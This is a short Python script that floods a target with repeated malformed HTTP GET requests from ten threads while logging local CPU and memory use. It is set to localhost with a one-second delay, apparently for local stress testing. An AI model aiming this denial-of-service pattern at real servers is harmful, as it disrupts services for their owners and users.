import socket
import threading
import logging
import psutil
import time


target="127.0.0.1"
port=80
trd=10
fake_ip="127.0.0.1"

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def attack(thread_id):
    """Sends a mock HTTP request to the target repeatedly."""
    count = 0  # Count the number of requests sent by each thread
    while True:
        try:
            # Create a socket and connect to the target
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))

            # Send data to simulate an HTTP GET request
            s.sendto(("GET /" + "A" * 500 + " HTTP/1.1\r\n").encode("utf-8"), (target, port))
            s.sendto(("Host: " + target + "\r\n\r\n").encode("utf-8"), (target, port))

            # Log each request sent
            count += 1
            logging.info(f"Thread {thread_id} sent request {count}")

            s.close()
            time.sleep(1)  # Add delay to control request rate
        except Exception as e:
            logging.error(f"Thread {thread_id} encountered an error: {e}")
            break  # Break loop on error to avoid infinite retries in case of network issues

def monitor_resources():
    "Monitors and logs CPU and Memory usage every second"
    while True:
        # Get CPU and Memory Usage
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_info = psutil.virtual_memory()

        # Log system resource usage
        logging.info(f"CPU Usage: {cpu_usage}% | Memory Usage: {memory_info.percent}%")
        time.sleep(1)  # Adjust the interval as needed



# Start resource monitoring in a separate thread
monitor_thread = threading.Thread(target=monitor_resources)
monitor_thread.daemon = True  # Daemonize to exit when main program ends
monitor_thread.start()


for i in range(trd):
    thread = threading.Thread(target=attack, args=(i,))
    thread.start()




